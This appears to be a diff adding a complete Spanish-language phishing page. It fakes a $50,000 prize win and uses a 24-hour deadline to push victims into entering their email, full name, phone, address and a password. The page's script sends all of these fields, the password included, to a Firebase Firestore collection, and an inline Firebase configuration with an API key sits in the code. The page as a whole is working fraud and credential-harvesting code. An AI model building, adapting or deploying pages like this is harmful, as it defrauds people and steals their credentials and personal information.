@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎉 ¡FELICIDADES! Has Ganado el MEGA PREMIO 2025</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Partículas flotantes */
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
+            animation: float 6s infinite linear;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .winner-card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            padding: 40px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            border: 3px solid #ffd700;
+            animation: pulse-glow 2s infinite;
+        }
+
+        @keyframes pulse-glow {
+            0%, 100% {
+                box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3), 0 0 0 0 rgba(255, 215, 0, 0.7);
+            }
+            50% {
+                box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3), 0 0 0 15px rgba(255, 215, 0, 0);
+            }
+        }
+
+        .confetti {
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 2rem;
+            animation: confetti-fall 3s infinite;
+        }
+
+        @keyframes confetti-fall {
+            0% {
+                transform: translateX(-50%) translateY(-20px) rotate(0deg);
+            }
+            100% {
+                transform: translateX(-50%) translateY(400px) rotate(720deg);
+            }
+        }
+
+        .trophy {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            animation: bounce 1s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {
+                transform: translateY(0);
+            }
+            40% {
+                transform: translateY(-20px);
+            }
+            60% {
+                transform: translateY(-10px);
+            }
+        }
+
+        .winner-title {
+            font-size: 3rem;
+            font-weight: bold;
+            background: linear-gradient(45deg, #ff6b6b, #ffd93d, #6bcf7f, #4ecdc4, #45b7d1);
+            background-size: 400% 400%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: rainbow 3s ease infinite;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        @keyframes rainbow {
+            0%, 100% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+        }
+
+        .prize-name {
+            font-size: 2.5rem;
+            color: #ff4757;
+            font-weight: bold;
+            margin: 20px 0;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .prize-value {
+            font-size: 3.5rem;
+            color: #2ed573;
+            font-weight: bold;
+            margin: 20px 0;
+            text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.3);
+            animation: scale-pulse 1.5s infinite;
+        }
+
+        @keyframes scale-pulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+        }
+
+        .description {
+            font-size: 1.2rem;
+            color: #333;
+            margin: 30px 0;
+            line-height: 1.6;
+        }
+
+        .register-section {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 30px;
+            border-radius: 20px;
+            margin-top: 30px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .register-title {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            background: rgba(255, 255, 255, 0.9);
+            transition: all 0.3s ease;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            background: white;
+            transform: scale(1.02);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .claim-btn {
+            background: linear-gradient(45deg, #ff6b6b, #ffd93d);
+            border: none;
+            padding: 20px 40px;
+            border-radius: 50px;
+            color: white;
+            font-size: 1.5rem;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .claim-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(45deg, #ff5252, #ffeb3b);
+        }
+
+        .claim-btn:active {
+            transform: translateY(-2px);
+        }
+
+        .warning {
+            background: rgba(255, 193, 7, 0.2);
+            border: 2px solid #ffc107;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            font-weight: bold;
+            color: #856404;
+        }
+
+        .emoji-rain {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+        }
+
+        .emoji {
+            position: absolute;
+            font-size: 2rem;
+            animation: emoji-fall 4s linear infinite;
+        }
+
+        @keyframes emoji-fall {
+            0% {
+                transform: translateY(-100px) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        .sparkle {
+            position: absolute;
+            color: #ffd700;
+            font-size: 1.5rem;
+            animation: sparkle 2s infinite;
+        }
+
+        @keyframes sparkle {
+            0%, 100% {
+                opacity: 0;
+                transform: scale(0);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .winner-title {
+                font-size: 2rem;
+            }
+            
+            .prize-name {
+                font-size: 1.8rem;
+            }
+            
+            .prize-value {
+                font-size: 2.5rem;
+            }
+            
+            .winner-card {
+                padding: 20px;
+            }
+        }
+    </style>
+ </style>
+</head>
+<body>
+  <div class="particles" id="particles"></div>
+  <div class="emoji-rain" id="emojiRain"></div>
+
+  <div class="container">
+    <div class="winner-card">
+      <div class="confetti">🎊🎉✨🎊🎉✨</div>
+
+      <div class="sparkle" style="top: 10px; left: 20px;">✨</div>
+      <div class="sparkle" style="top: 30px; right: 30px;">⭐</div>
+      <div class="sparkle" style="bottom: 20px; left: 40px;">💫</div>
+      <div class="sparkle" style="bottom: 40px; right: 20px;">✨</div>
+
+      <div class="trophy">🏆</div>
+
+      <h1 class="winner-title">¡FELICIDADES! 🎉</h1>
+
+      <div class="prize-name">🌟 MEGA PREMIO DORADO 2025 🌟</div>
+
+      <div class="prize-value">💰 $50,000 USD 💰</div>
+
+      <div class="description">
+        🎯 <strong>¡Has sido seleccionado como GANADOR OFICIAL!</strong> 🎯<br />
+        🚀 Tu código de suerte: <strong style="color: #ff4757;">LUCKY-2025-GOLD</strong> 🚀<br />
+        ⚡ Premio incluye: Dinero en efectivo + Viaje todo pagado + Experiencia VIP ⚡
+      </div>
+
+      <div class="warning">
+        ⏰ <strong>¡ATENCIÓN!</strong> Esta oferta expira en 24 horas. ¡No pierdas esta oportunidad única! ⏰
+      </div>
+
+      <div class="register-section">
+        <h2 class="register-title">🔐 Para Reclamar Tu Premio Regístrate Aquí 🔐</h2>
+
+        <form id="prizeForm">
+          <div class="form-group">
+            <label>📧 Email:</label>
+            <input type="email" name="email" required placeholder="tu-email@ejemplo.com">
+          </div>
+
+          <div class="form-group">
+            <label>👤 Nombre Completo:</label>
+            <input type="text" name="fullName" required placeholder="Tu nombre completo">
+          </div>
+
+          <div class="form-group">
+            <label>📱 Teléfono:</label>
+            <input type="tel" name="phone" required placeholder="+1 234 567 8900">
+          </div>
+
+          <div class="form-group">
+            <label>🏠 Dirección:</label>
+            <input type="text" name="address" required placeholder="Tu dirección completa">
+          </div>
+
+          <!-- 🆕 NUEVO CAMPO: Contraseña -->
+          <div class="form-group">
+            <label>🔒 Contraseña:</label>
+            <input type="password" name="password" required placeholder="Escribe una contraseña segura">
+          </div>
+
+          <button type="submit" class="claim-btn">🎁 ¡RECLAMAR MI PREMIO AHORA! 🎁</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- Scripts de Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+
+  <script>
+    // Crear partículas flotantes
+    function createParticles() {
+      const particlesContainer = document.getElementById('particles');
+      for (let i = 0; i < 50; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        particle.style.left = Math.random() * 100 + '%';
+        particle.style.width = Math.random() * 10 + 5 + 'px';
+        particle.style.height = particle.style.width;
+        particle.style.animationDelay = Math.random() * 6 + 's';
+        particle.style.animationDuration = (Math.random() * 3 + 3) + 's';
+        particlesContainer.appendChild(particle);
+      }
+    }
+
+    // Lluvia de emojis
+    function createEmojiRain() {
+      const emojiContainer = document.getElementById('emojiRain');
+      const emojis = ['🎉', '🎊', '💰', '🏆', '⭐', '✨', '💎', '🎁', '🌟', '💫'];
+
+      setInterval(() => {
+        const emoji = document.createElement('div');
+        emoji.className = 'emoji';
+        emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+        emoji.style.left = Math.random() * 100 + '%';
+        emoji.style.animationDuration = (Math.random() * 2 + 3) + 's';
+        emojiContainer.appendChild(emoji);
+
+        setTimeout(() => emoji.remove(), 5000);
+      }, 300);
+    }
+
+    // Configuración Firebase
+    const firebaseConfig = {
+      apiKey: "AIzaSyA4XvXsNnlHeZyx5RVXgphO9r1Y2TDN7so",
+      authDomain: "servidor-98545.firebaseapp.com",
+      projectId: "servidor-98545",
+      storageBucket: "servidor-98545.appspot.com",
+      messagingSenderId: "112888775827591994168",
+      appId: "1:112888775827591994168:servidor-98545"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // Evento del formulario
+    document.getElementById('prizeForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(this);
+      const data = {
+        email: formData.get('email'),
+        fullName: formData.get('fullName'),
+        phone: formData.get('phone'),
+        address: formData.get('address'),
+        password: formData.get('password'), // 🆕 Incluye la contraseña
+        timestamp: new Date().toISOString(),
+        prizeCode: 'LUCKY-2025-GOLD'
+      };
+
+      // Enviar a Firebase
+      db.collection('Servidor').doc('direccion').set(data)
+        .then(() => {
+          for (let i = 0; i < 20; i++) {
+            setTimeout(() => {
+              const confetti = document.createElement('div');
+              confetti.style.position = 'fixed';
+              confetti.style.left = Math.random() * 100 + '%';
+              confetti.style.top = '-10px';
+              confetti.style.fontSize = '2rem';
+              confetti.style.zIndex = '1000';
+              confetti.textContent = ['🎉', '🎊', '✨', '🎁'][Math.floor(Math.random() * 4)];
+              confetti.style.animation = 'confetti-fall 3s linear forwards';
+              document.body.appendChild(confetti);
+              setTimeout(() => confetti.remove(), 3000);
+            }, i * 100);
+          }
+
+          alert('🎉 ¡Registro exitoso! Tu premio será procesado en las próximas 24-48 horas. ¡Felicidades! 🎉');
+        })
+        .catch(error => {
+          console.error('Error al enviar los datos:', error);
+          alert('Hubo un error al procesar tu solicitud. Por favor, inténtalo de nuevo más tarde.');
+        });
+    });
+
+    // Iniciar efectos
+    createParticles();
+    createEmojiRain();
+
+    // Sparkle aleatorio
+    setInterval(() => {
+      const sparkles = document.querySelectorAll('.sparkle');
+      sparkles.forEach(sparkle => {
+        sparkle.style.animationDelay = Math.random() * 2 + 's';
+      });
+    }, 3000);
+  </script>
+</body>
+</html>
